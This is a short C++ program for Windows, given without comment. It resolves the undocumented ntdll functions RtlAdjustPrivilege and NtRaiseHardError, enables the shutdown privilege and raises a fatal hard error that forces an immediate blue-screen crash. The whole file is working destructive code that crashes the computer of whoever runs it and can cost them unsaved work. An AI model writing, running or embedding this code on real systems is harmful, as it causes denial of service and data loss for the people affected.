#include <iostream>
#include <windows.h>
#include <winternl.h>

using _NtRaiseHardError = NTSTATUS (NTAPI *)(
	NTSTATUS ErrorStatus,
	ULONG NumberOfParameters,
	ULONG UnicodeStringParametrMask,
	PULONG_PTR Parameters, 
	ULONG ValidResponseOptions,
	PULONG Response
);

using _RtlAdjustPrivilege = NTSTATUS(NTAPI *)(
	ULONG Privilege,
	BOOLEAN Enable,
	BOOLEAN CurentThread,
	PBOOLEAN Enabled
);

int main() {
	auto NtRaiseHardError = (_NtRaiseHardError)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
	auto RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
	
	BOOLEAN bEnabled;
	ULONG uResponse;

	RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);

	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &uResponse);

	return 0;
}